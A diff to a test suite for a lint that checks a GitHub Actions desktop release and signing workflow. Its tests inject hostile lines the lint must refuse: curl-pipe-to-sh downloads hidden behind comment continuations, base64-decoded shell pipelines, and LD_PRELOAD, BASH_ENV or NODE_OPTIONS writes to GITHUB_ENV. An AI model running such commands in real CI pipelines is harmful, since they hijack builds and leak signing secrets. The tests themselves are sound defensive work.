@@ -13,9 +13,12 @@ import { fileURLToPath } from 'node:url';
 import {
   checkLockfile,
   checkWorkflow,
+  CLEANUP_STEP,
+  logicalLines,
   parseWorkflow,
   SIGNING_TOOLS_INSTALL,
   secretReferences,
+  VETTED_STEPS,
   workflowTauriCliVersion,
 } from './desktop-release-workflow-lint.mjs';
 
@@ -48,7 +51,7 @@ const signingTools = (name) =>
   readFileSync(join(shellDir, 'signing-tools', name), 'utf8');
 
 const UPDATER_TAIL =
-  '          test "${#payloads[@]}" -eq 1\n          "$PWD/$SHELL_DIR/signing-tools/node_modules/.bin/tauri" signer sign "${payloads[0]}"';
+  '          test "${#payloads[@]}" -eq 1\n          "$GITHUB_WORKSPACE/$SHELL_DIR/signing-tools/node_modules/.bin/tauri" signer sign "${payloads[0]}"';
 const BUILD_STEP_ENV = `        env:
           TARGET: \${{ matrix.target }}
           BUNDLES: \${{ matrix.bundles }}
@@ -182,8 +185,8 @@ describe('a secret step is made only of allow-listed signing commands', () => {
         mutate(
           UPDATER_TAIL,
           UPDATER_TAIL.replace(
-            '          "$PWD',
-            `          ${extra}\n          "$PWD`,
+            '          "$GITHUB_WORKSPACE',
+            `          ${extra}\n          "$GITHUB_WORKSPACE`,
           ),
         ),
         pattern,
@@ -364,8 +367,8 @@ describe('block scalars cannot hide a command (the lint reads parsed YAML)', () 
         mutate(
           UPDATER_TAIL,
           UPDATER_TAIL.replace(
-            '          "$PWD',
-            `          bash ./x.sh\n          "$PWD`,
+            '          "$GITHUB_WORKSPACE',
+            `          bash ./x.sh\n          "$GITHUB_WORKSPACE`,
           ),
         ).replace(
           '        run: |\n          set -euo pipefail\n          shopt',
@@ -378,7 +381,7 @@ describe('block scalars cannot hide a command (the lint reads parsed YAML)', () 
     fails(
       mutate(
         UPDATER_TAIL,
-        UPDATER_TAIL.replace('          "$PWD', '          bash ./x.sh\n          "$PWD'),
+        UPDATER_TAIL.replace('          "$GITHUB_WORKSPACE', '          bash ./x.sh\n          "$GITHUB_WORKSPACE'),
       ).replace(
         '        run: |\n          set -euo pipefail\n          shopt',
         '        run: >-\n          set -euo pipefail\n          shopt',
@@ -518,7 +521,7 @@ describe('YAML anchors, aliases, merge keys and tags are refused', () => {
 
 describe('a secret step runs only allow-listed commands', () => {
   const insert = (extra) =>
-    mutate(UPDATER_TAIL, UPDATER_TAIL.replace('          "$PWD', `          ${extra}\n          "$PWD`));
+    mutate(UPDATER_TAIL, UPDATER_TAIL.replace('          "$GITHUB_WORKSPACE', `          ${extra}\n          "$GITHUB_WORKSPACE`));
 
   it('refuses scripts, interpreters and other ways to run anything', () => {
     for (const extra of [
@@ -575,8 +578,8 @@ describe('a secret step runs only allow-listed commands', () => {
   });
 
   it('refuses the Tauri CLI from PATH and any other binary location', () => {
-    fails(mutate(UPDATER_TAIL, UPDATER_TAIL.replace('"$PWD/$SHELL_DIR/signing-tools/node_modules/.bin/tauri"', 'tauri')));
-    fails(mutate(UPDATER_TAIL, UPDATER_TAIL.replace('"$PWD/$SHELL_DIR/signing-tools/node_modules/.bin/tauri"', '"$RUNNER_TEMP/tauri"')));
+    fails(mutate(UPDATER_TAIL, UPDATER_TAIL.replace('"$GITHUB_WORKSPACE/$SHELL_DIR/signing-tools/node_modules/.bin/tauri"', 'tauri')));
+    fails(mutate(UPDATER_TAIL, UPDATER_TAIL.replace('"$GITHUB_WORKSPACE/$SHELL_DIR/signing-tools/node_modules/.bin/tauri"', '"$RUNNER_TEMP/tauri"')));
   });
 
   it('refuses keys that change how the script runs, and stray env', () => {
@@ -618,8 +621,8 @@ describe('a secret step runs only allow-listed commands', () => {
 describe('the token permissions', () => {
   const preflight = () =>
     parseWorkflow(source).jobs.find((job) => job.id === 'release-preflight');
-  const PERMISSIONS =
-    '    permissions:\n      contents: read\n      actions: read\n    steps:\n      - name: Require main';
+  const DEFAULTS = '    defaults:\n      run:\n        shell: bash\n';
+  const PERMISSIONS = `    permissions:\n      contents: read\n      actions: read\n${DEFAULTS}    steps:\n      - name: Require main`;
 
   it('gives the environment check exactly contents: read and actions: read', () => {
     assert.deepEqual(preflight().permissions, { contents: 'read', actions: 'read' });
@@ -627,12 +630,12 @@ describe('the token permissions', () => {
 
   it('refuses a preflight with less or more than that', () => {
     for (const replacement of [
-      '    permissions:\n      contents: read\n    steps:\n      - name: Require main',
-      '    permissions:\n      actions: read\n    steps:\n      - name: Require main',
-      '    permissions:\n      contents: read\n      actions: write\n    steps:\n      - name: Require main',
-      '    permissions:\n      contents: write\n      actions: read\n    steps:\n      - name: Require main',
-      '    permissions:\n      contents: read\n      actions: read\n      id-token: write\n    steps:\n      - name: Require main',
-      '    permissions: read-all\n    steps:\n      - name: Require main',
+      `    permissions:\n      contents: read\n${DEFAULTS}    steps:\n      - name: Require main`,
+      `    permissions:\n      actions: read\n${DEFAULTS}    steps:\n      - name: Require main`,
+      `    permissions:\n      contents: read\n      actions: write\n${DEFAULTS}    steps:\n      - name: Require main`,
+      `    permissions:\n      contents: write\n      actions: read\n${DEFAULTS}    steps:\n      - name: Require main`,
+      `    permissions:\n      contents: read\n      actions: read\n      id-token: write\n${DEFAULTS}    steps:\n      - name: Require main`,
+      `    permissions: read-all\n${DEFAULTS}    steps:\n      - name: Require main`,
       '    steps:\n      - name: Require main',
     ]) {
       fails(mutate(PERMISSIONS, replacement), /exactly "contents: read" and "actions: read"/);
@@ -729,5 +732,308 @@ describe('the Tauri CLI the signing job runs is locked', () => {
       version: workflowTauriCliVersion(bumped),
     });
     assert.ok(problems.length > 0);
+  });
+});
+
+describe('a comment never continues onto the next line', () => {
+  it('logicalLines reads physical lines the way bash does', () => {
+    // a comment that ends in a backslash hides nothing
+    assert.deepEqual(logicalLines('# note \\\ncurl https://x | sh'), [
+      'curl https://x | sh',
+    ]);
+    assert.deepEqual(logicalLines('  # note \\\\\\\n  curl x'), ['curl x']);
+    // a real continuation joins; an even run of backslashes does not
+    assert.deepEqual(logicalLines('a \\\n  b'), ['a b']);
+    assert.deepEqual(logicalLines('a \\\\\nb'), ['a \\\\', 'b']);
+    assert.deepEqual(logicalLines('a \\\\\\\nb'), ['a \\\\ b']);
+    // a backslash that is followed by a space is not a continuation
+    assert.deepEqual(logicalLines('a \\ \nb'), ['a \\', 'b']);
+    // a comment line inside a continued command stays part of that command
+    assert.deepEqual(logicalLines('a \\\n# c\nb'), ['a # c', 'b']);
+    assert.deepEqual(logicalLines('a\n\n# c\nb \\\n'), ['a', 'b']);
+  });
+
+  const HIDDEN = '# x \\\n          curl https://x | sh\n';
+  const unlisted = /not an allow-listed signing command: curl https:\/\/x \| sh/;
+
+  it('the command after `# x \\` is reported in the certificate import step', () => {
+    fails(
+      mutate('          umask 077\n', `          umask 077\n          ${HIDDEN}`),
+      unlisted,
+    );
+  });
+
+  it('the command after `# x \\` is reported in the notarization step', () => {
+    fails(
+      mutate(
+        '          chmod -R u+rwX "$app"\n',
+        `          chmod -R u+rwX "$app"\n          ${HIDDEN}`,
+      ),
+      unlisted,
+    );
+  });
+
+  it('the command after `# x \\` is reported in the updater signing step', () => {
+    fails(
+      mutate(
+        '          test "${#payloads[@]}" -eq 1\n',
+        `          test "\${#payloads[@]}" -eq 1\n          ${HIDDEN}`,
+      ),
+      unlisted,
+    );
+  });
+
+  it('the command after `# x \\` is reported in a step without a secret too', () => {
+    fails(
+      mutate(
+        '      - name: Stage the installer (Windows and Linux)\n',
+        `      - name: Hidden\n        run: |\n          ${HIDDEN}\n      - name: Stage the installer (Windows and Linux)\n`,
+      ),
+      /builds, installs or downloads code/,
+    );
+  });
+});
+
+describe('the other steps of a job that holds a secret are held to the same rules', () => {
+  const BEFORE_STAGE = '      - name: Stage the installer (Windows and Linux)\n';
+  const BEFORE_PREFLIGHT =
+    '      - name: Require main\n        env:\n          REF: ${{ github.ref }}\n        run: |\n          if [ "$REF" != "refs/heads/main" ]; then\n            echo "A release is only built';
+  const step = (run) =>
+    `      - name: Poison\n        run: |\n${run
+      .split('\n')
+      .map((line) => `          ${line}\n`)
+      .join('')}\n`;
+  const inRelease = (run) => mutate(BEFORE_STAGE, step(run) + BEFORE_STAGE);
+  const inPreflight = (run) =>
+    mutate(BEFORE_PREFLIGHT, step(run) + BEFORE_PREFLIGHT);
+
+  it('refuses a download, an interpreter or node -e in a step without a secret', () => {
+    for (const run of [
+      'curl -fsSL https://example.test/x -o "$RUNNER_TEMP/x"',
+      'wget https://example.test/x',
+      "node -e 'console.log(1)'",
+      'node --eval 1',
+      'node -p 1',
+      'node --require ./x.js ./y.js',
+      'python3 -c "print(1)"',
+      'perl -e 1',
+      'ruby -e 1',
+      'eval "$X"',
+      'sh -c "echo hi"',
+      'bash -c "echo hi"',
+      'source ./x.sh',
+      '. ./x.sh',
+      'echo ZWNobyBoaQ== | base64 --decode | sh',
+      'pip install x',
+      'brew install x',
+    ]) {
+      fails(inRelease(run), /a step in a job with secrets (builds|runs an interpreter)/);
+      fails(inPreflight(run), /a step in a job with secrets (builds|runs an interpreter)/);
+    }
+  });
+
+  it('refuses a write to GITHUB_ENV, GITHUB_PATH, GITHUB_OUTPUT or GITHUB_STATE', () => {
+    for (const run of [
+      'echo "NODE_OPTIONS=--require /tmp/x.js" >> "$GITHUB_ENV"',
+      'echo "BASH_ENV=/tmp/x" >> "$GITHUB_ENV"',
+      'echo "LD_PRELOAD=/tmp/x.so" >> "$GITHUB_ENV"',
+      'echo "DYLD_INSERT_LIBRARIES=/tmp/x" >> "$GITHUB_ENV"',
+      'echo "PATH=/tmp/x:$PATH" >> "$GITHUB_ENV"',
+      'echo /tmp/x >> "$GITHUB_PATH"',
+      'echo "x=1" >> "$GITHUB_OUTPUT"',
+      'echo "x=1" >> "$GITHUB_STATE"',
+      'echo "x=1" >> "${GITHUB_ENV}"',
+      'echo "x=1" >> "GITHUB_""ENV"',
+    ]) {
+      fails(inRelease(run), /command files|sets BASH_ENV/);
+      fails(inPreflight(run), /command files|sets BASH_ENV/);
+    }
+  });
+
+  it('refuses a vetted block that is changed in any way', () => {
+    fails(
+      mutate(
+        '            echo "OVERLAY_FILE=$RUNNER_TEMP/desktop-overlay.json"\n',
+        '            echo "OVERLAY_FILE=$RUNNER_TEMP/desktop-overlay.json"\n            echo "PATH=/tmp/x:$PATH"\n',
+      ),
+      /command files|sets BASH_ENV/,
+    );
+    fails(
+      mutate(
+        '          process.stdout.write("PRODUCT_VERSION=" + o.version + "\\n");\n',
+        '          process.stdout.write("PRODUCT_VERSION=" + o.version + "\\n");\n          process.stdout.write("BASH_ENV=/tmp/x\\n");\n',
+      ),
+      /interpreter|command files/,
+    );
+    fails(
+      mutate(
+        '      - name: Re-verify the bundle and read the product identity\n        env:\n          TARGET: ${{ matrix.target }}\n',
+        '      - name: Re-verify the bundle and read the product identity\n        env:\n          TARGET: ${{ matrix.target }}\n          NODE_OPTIONS: --require /tmp/x.js\n',
+      ),
+      /interpreter|command files/,
+    );
+  });
+
+  it('the vetted blocks write only the names they list, none of them dangerous', () => {
+    for (const entry of VETTED_STEPS) {
+      const written = [...entry.run.matchAll(/"([A-Za-z_]+)=/g)].map((m) => m[1]);
+      for (const name of written) assert.ok(entry.writes.includes(name), name);
+      for (const name of entry.writes) {
+        assert.doesNotMatch(
+          name,
+          /^(PATH|ENV|BASH_ENV|NODE_OPTIONS|NODE_PATH|LD_.*|DYLD_.*)$/,
+        );
+      }
+    }
+  });
+});
+
+describe('a string that holds an expression is searched whole for secrets', () => {
+  it('finds a secret behind a `}}` inside a string literal', () => {
+    assert.equal(
+      secretReferences({ a: "${{ '}}' || secrets.APPLE_ID }}" }).length,
+      1,
+    );
+    assert.equal(
+      secretReferences({ a: '${{ "}}" || secrets.APPLE_ID }}' }).length,
+      1,
+    );
+    assert.equal(
+      secretReferences({ "${{ '}}' || secrets.A }}": 1 }).length,
+      1,
+    );
+    fails(
+      mutate(
+        '          BUNDLES: ${{ matrix.bundles }}\n        run: |\n          tauri build --no-sign',
+        "          BUNDLES: ${{ matrix.bundles }}\n          LEAK: ${{ '}}' || secrets.APPLE_ID }}\n        run: |\n          tauri build --no-sign",
+      ),
+      /holds a secret|its own env entry/,
+    );
+  });
+});
+
+describe('defaults.run cannot move or re-shell a job that holds a secret', () => {
+  const RELEASE_DEFAULTS =
+    '    defaults:\n      run:\n        shell: bash\n    # One failed leg stops';
+  const PREFLIGHT_DEFAULTS =
+    '      actions: read\n    defaults:\n      run:\n        shell: bash\n    steps:\n      - name: Require main';
+
+  it('refuses a working directory at workflow level and in a job with a secret', () => {
+    fails(
+      mutate(
+        '\njobs:\n  verify-build:',
+        '\ndefaults:\n  run:\n    working-directory: /tmp\n\njobs:\n  verify-build:',
+      ),
+      /workflow-level defaults.*working-directory/,
+    );
+    fails(
+      mutate(
+        RELEASE_DEFAULTS,
+        '    defaults:\n      run:\n        shell: bash\n        working-directory: /tmp\n    # One failed leg stops',
+      ),
+      /job with secrets: defaults.*working-directory/,
+    );
+    fails(
+      mutate(
+        PREFLIGHT_DEFAULTS,
+        '      actions: read\n    defaults:\n      run:\n        shell: bash\n        working-directory: ..\n    steps:\n      - name: Require main',
+      ),
+      /job with secrets: defaults.*working-directory/,
+    );
+  });
+
+  it('requires the shell to be exactly bash in a job with a secret', () => {
+    for (const shell of ['pwsh', 'python {0}', 'bash -e {0}', 'sh', 'cmd']) {
+      fails(
+        mutate(
+          RELEASE_DEFAULTS,
+          `    defaults:\n      run:\n        shell: ${JSON.stringify(shell)}\n    # One failed leg stops`,
+        ),
+        /not exactly bash/,
+      );
+    }
+    // absent is not enough either: the Windows default is PowerShell
+    fails(
+      mutate(RELEASE_DEFAULTS, '    # One failed leg stops'),
+      /does not set defaults.run.shell to exactly bash/,
+    );
+    fails(
+      mutate(
+        PREFLIGHT_DEFAULTS,
+        '      actions: read\n    steps:\n      - name: Require main',
+      ),
+      /does not set defaults.run.shell to exactly bash/,
+    );
+    fails(
+      mutate(
+        '\njobs:\n  verify-build:',
+        '\ndefaults:\n  run:\n    shell: pwsh\n\njobs:\n  verify-build:',
+      ),
+      /workflow-level defaults.*pwsh/,
+    );
+  });
+
+  it('anchors the signing command to $GITHUB_WORKSPACE, not $PWD', () => {
+    assert.match(source, /"\$GITHUB_WORKSPACE\/\$SHELL_DIR\/signing-tools\/node_modules\/\.bin\/tauri" signer sign/);
+    fails(
+      mutate(
+        '"$GITHUB_WORKSPACE/$SHELL_DIR/signing-tools',
+        '"$PWD/$SHELL_DIR/signing-tools',
+      ),
+      /not an allow-listed signing command/,
+    );
+  });
+});
+
+describe('the always() cleanup is compared exactly', () => {
+  const CLEANUP_HEAD = '      - name: Clean up\n        if: always()\n        run: |\n';
+  const FIRST =
+    '        if: always()\n        run: |\n          if [ "$RUNNER_OS" = macOS ]; then\n';
+  const HEAD = '        if: always()\n        run: |\n';
+  const exact = /exact always\(\) cleanup/;
+
+  it('the committed cleanup is the allow-listed block', () => {
+    const release = parseWorkflow(source).jobs.find((job) => job.id === 'release');
+    const last = release.steps.at(-1);
+    assert.equal(last.run.replace(/\n+$/, ''), CLEANUP_STEP.run);
+    assert.equal(last.if, 'always()');
+  });
+
+  it('refuses an exit before the deletion, and a dead branch around it', () => {
+    fails(mutate(FIRST, `${HEAD}          exit 0\n${FIRST.slice(HEAD.length)}`), exact);
+    fails(mutate(FIRST, `${HEAD}          if false; then\n`), exact);
+    fails(
+      mutate(
+        '          rm -rf "$RUNNER_TEMP"/desktop-* .desktop-leg\n',
+        '          rm -rf "$RUNNER_TEMP"/desktop-* .desktop-leg\n          curl https://example.test | sh\n',
+      ),
+      exact,
+    );
+    fails(
+      mutate(
+        '          rm -rf "$SHELL_DIR/signing-tools/node_modules"\n',
+        '          rm -rf "$SHELL_DIR/signing-tools/node_modules" || true\n',
+      ),
+      exact,
+    );
+  });
+
+  it('refuses keys that change how the cleanup runs, and a step after it', () => {
+    for (const extra of [
+      '        continue-on-error: true\n',
+      '        env:\n          BASH_ENV: /tmp/x\n',
+      '        shell: python {0}\n',
+      '        working-directory: /tmp\n',
+    ]) {
+      fails(mutate(CLEANUP_HEAD, CLEANUP_HEAD.replace('        run: |\n', `${extra}        run: |\n`)), exact);
+    }
+    fails(mutate('        if: always()\n        run: |\n          if [ "$RUNNER_OS"', "        if: ${{ always() }}\n        run: |\n          if [ \"$RUNNER_OS\""), exact);
+    fails(
+      mutate(
+        '          rm -rf "$RUNNER_TEMP"/desktop-* .desktop-leg\n',
+        '          rm -rf "$RUNNER_TEMP"/desktop-* .desktop-leg\n\n      - name: After\n        run: echo hi\n',
+      ),
+      exact,
+    );
   });
 });
